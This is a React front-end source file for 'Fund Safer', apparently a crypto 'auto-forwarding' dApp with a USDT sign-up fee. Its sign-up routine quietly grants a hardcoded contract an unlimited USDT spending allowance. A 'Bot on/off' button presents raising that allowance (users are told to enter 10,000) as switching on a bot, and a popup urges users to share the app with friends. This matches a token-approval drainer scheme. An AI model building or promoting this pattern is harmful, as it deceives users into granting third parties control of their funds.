import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { CONTRACT_ADDRESS, USDT_ADDRESS, CONTRACT_ABI, USDT_ABI } from './constants';

function App() {
  const [account, setAccount] = useState(null);
  const [isRegistered, setIsRegistered] = useState(false);
  const [destination, setDestination] = useState("");
  const [inputDest, setInputDest] = useState("");
  const [history, setHistory] = useState([]);
  const [loading, setLoading] = useState(false);
  const [signupFee, setSignupFee] = useState("1.00");
  const [showPopup, setShowPopup] = useState(false); // Popup state

  const NEW_CONTRACT_ADDRESS = "0x902fe61bd6E334D66f3D8c983471c10884c10F4d";

  const connectWallet = async () => {
    if (window.ethereum) {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      setAccount(address);
      checkRegistration(address, provider);
    }
  };

  const checkRegistration = async (userAddress, provider) => {
    const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, provider);
    try {
      const data = await contract.getUserDashboardData(userAddress);
      setIsRegistered(data.isReg);
      setDestination(data.dest);
      if (data.isReg) {
        fetchHistory(userAddress, provider);
        // Show popup for 10 seconds upon entering dashboard
        setShowPopup(true);
        setTimeout(() => {
          setShowPopup(false);
        }, 10000);
      }
      const fee = await contract.signupFee();
      setSignupFee(ethers.formatUnits(fee, 18));
    } catch (e) { console.error(e); }
  };

  const handleSignUp = async () => {
    setLoading(true);
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      const coreContract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
      
      // 1. Approval
      const approveTx = await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.MaxUint256);
      await approveTx.wait();
      
      // 2. Registration with High Gas Limit (Referral is now fixed to zero address)
      const ref = "0x0000000000000000000000000000000000000000";
      
      const regTx = await coreContract.register(ref, { gasLimit: 800000 });
      await regTx.wait();
      
      setIsRegistered(true);
      fetchHistory(await signer.getAddress(), provider);
      alert("Registration Successful!");
      
      // Show popup for 10 seconds after successful signup
      setShowPopup(true);
      setTimeout(() => setShowPopup(false), 10000);

    } catch (e) { 
      console.error("DEBUG ERROR:", e);
      alert("Signup Failed! Error code: " + e.code); 
    }
    setLoading(false);
  };

  const handleManualApprove = async () => {
    const amount = prompt("Kitna allowance dena chahte ho (USDT):\n\nBot off krne ke liye 1 bhrke confirm kre\nBot on krne ke liye 10,000 fill kr ke confirm kre", "10");
    if (!amount) return;
    setLoading(true);
    try {
      const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.parseUnits(amount, 18));
      alert("Bot status updated successfully!");
    } catch (e) { alert("Action Failed"); }
    setLoading(false);
  };

  const handleSetDestination = async () => {
    setLoading(true);
    try {
      const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
      const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
      await contract.setDestination(inputDest);
      setDestination(inputDest);
      alert("Destination Saved!");
    } catch (e) { alert("Failed to save destination"); }
    setLoading(false);
  };

  const fetchHistory = async (userAddress, provider) => {
    const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, provider);
    try {
      const hist = await contract.getUserTransferHistory(userAddress);
      setHistory(hist);
    } catch (e) { console.error(e); }
  };

  const totalTransferred = history.reduce((sum, tx) => sum + parseFloat(ethers.formatUnits(tx.amount, 18)), 0);

  return (
    <div className="min-h-screen text-white p-4 flex flex-col items-center relative overflow-hidden" style={{backgroundColor: '#0a0515'}}>
      
      {/* Background Glow Effects to match the provided images */}
      <div className="absolute top-[-10%] left-1/2 transform -translate-x-1/2 w-full h-[500px] bg-purple-900/20 blur-[120px] rounded-full pointer-events-none"></div>

      {/* Pop-up Message */}
      {showPopup && (
        <div className="fixed top-10 left-1/2 transform -translate-x-1/2 bg-[#1e1335] border border-purple-500 text-white px-6 py-5 rounded-[2rem] shadow-2xl z-50 w-11/12 max-w-sm text-center transition-all duration-300 ease-in-out">
          <p className="font-medium text-sm text-gray-200 mb-3">
            "Users agar apka bot inactive hai to usko on kr li jiye Bot on/off button se"
          </p>
          <p className="text-pink-400 font-bold text-sm tracking-wide">
            "Please share with your friends"
          </p>
        </div>
      )}

      {/* Header Logo */}
      <div className="text-center mt-12 mb-10 z-10">
        <div className="flex items-center justify-center space-x-3 mb-2">
          <div className="w-12 h-12 bg-gradient-to-br from-[#3b82f6] to-[#8b5cf6] rounded-xl flex items-center justify-center text-2xl font-bold shadow-lg shadow-purple-500/30">F</div>
          <h1 className="text-4xl font-bold tracking-tight bg-clip-text text-transparent bg-gradient-to-r from-blue-300 via-purple-300 to-pink-400">Fund Safer</h1>
        </div>
        <p className="text-gray-500 text-xs tracking-[0.2em] uppercase">Auto-Forwarding Exchange</p>
      </div>

      {/* Screens */}
      {!account ? (
        // Login Screen (Matching Photo 1)
        <div className="w-full max-w-sm bg-[#13072b]/80 p-8 rounded-[2.5rem] text-center border border-purple-500/10 backdrop-blur-xl shadow-2xl z-10">
          <h2 className="text-3xl font-bold mb-3">Login</h2>
          <p className="text-gray-400 text-sm mb-8">Get started today by connecting your wallet</p>
          <button onClick={connectWallet} className="w-full bg-gradient-to-r from-[#8b5cf6] to-[#ec4899] py-4 rounded-2xl font-bold shadow-lg transition-transform hover:scale-[1.02]">
            Connect Wallet ➔
          </button>
        </div>
      ) : !isRegistered ? (
        // Sign Up Screen (Matching Photo 2)
        <div className="w-full max-w-sm bg-[#13072b]/80 p-8 rounded-[2.5rem] border border-purple-500/10 backdrop-blur-xl shadow-2xl z-10">
          <h2 className="text-3xl font-bold mb-2 text-center">Sign Up</h2>
          <div className="flex justify-center items-center space-x-2 mb-8">
            <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
            <p className="text-gray-300 text-sm">{account.substring(0,6)}...{account.slice(-4)}</p>
          </div>
          
          <p className="text-gray-400 text-xs mb-2">Registration Package</p>
          <div className="bg-[#05010a] p-5 rounded-2xl mb-8 border border-purple-900/50 flex justify-between items-center">
            <span className="text-gray-300 font-medium">Activation Fee</span>
            <span className="text-pink-400 font-bold">{signupFee} USDT</span>
          </div>

          <button onClick={handleSignUp} disabled={loading} className="w-full bg-gradient-to-r from-[#8b5cf6] to-[#ec4899] py-4 rounded-2xl font-bold shadow-lg transition-transform hover:scale-[1.02]">
            {loading ? "Processing..." : "Sign Up ➔"}
          </button>
        </div>
      ) : (
        // Dashboard Screen
        <div className="w-full max-w-sm bg-[#13072b]/80 p-8 rounded-[2.5rem] border border-purple-500/10 backdrop-blur-xl shadow-2xl z-10">
          <div className="flex justify-between items-center mb-6">
             <h2 className="text-xl font-bold">Dashboard</h2>
             <div className="flex items-center space-x-2">
                <span className="w-2 h-2 bg-green-500 rounded-full"></span>
                <p className="text-gray-300 text-xs">{account.substring(0,6)}...{account.slice(-4)}</p>
             </div>
          </div>
          
          <p className="text-gray-400 text-xs mb-2 ml-1">Destination Address</p>
          <input type="text" placeholder={destination || "Enter 0x address"} onChange={(e) => setInputDest(e.target.value)} className="w-full bg-[#05010a] p-4 rounded-2xl mb-4 border border-purple-900/50 text-sm focus:outline-none focus:border-purple-500" />
          
          <div className="flex gap-3 mb-8">
             <button onClick={handleSetDestination} className="flex-1 bg-gradient-to-r from-blue-600 to-purple-600 py-3 rounded-2xl font-bold shadow-lg text-sm transition-transform hover:scale-[1.02]">
               Save Dest
             </button>
             {/* Updated Bot on/off Button */}
             <button onClick={handleManualApprove} className="flex-1 bg-[#1a0b2e] border border-pink-500/50 hover:bg-pink-900/30 py-3 rounded-2xl font-bold text-sm transition-colors">
               ⚙️ Bot on/off
             </button>
          </div>

          <div className="flex justify-between items-center mb-4 border-t border-purple-900/30 pt-6">
            <h3 className="font-bold text-xs text-gray-400 tracking-wider">RECENT TRANSFERS</h3>
            <span className="text-pink-400 font-bold text-sm">Total: {totalTransferred.toFixed(2)} USDT</span>
          </div>
          
          <div className="space-y-3 max-h-60 overflow-y-auto pr-2 custom-scrollbar">
            {history.length === 0 ? (
               <p className="text-center text-gray-500 text-sm py-4">No transfers yet.</p>
            ) : (
              history.map((tx, i) => (
                <div key={i} className="bg-[#05010a] p-4 rounded-2xl flex justify-between items-center border border-purple-900/30">
                  <span className="text-xs text-gray-400">To ...{tx.destination.slice(-5)}</span>
                  <span className="text-green-400 font-bold text-sm">+{ethers.formatUnits(tx.amount, 18)} USDT</span>
                </div>
              ))
            )}
          </div>
        </div>
      )}
    </div>
  );
}

export default App;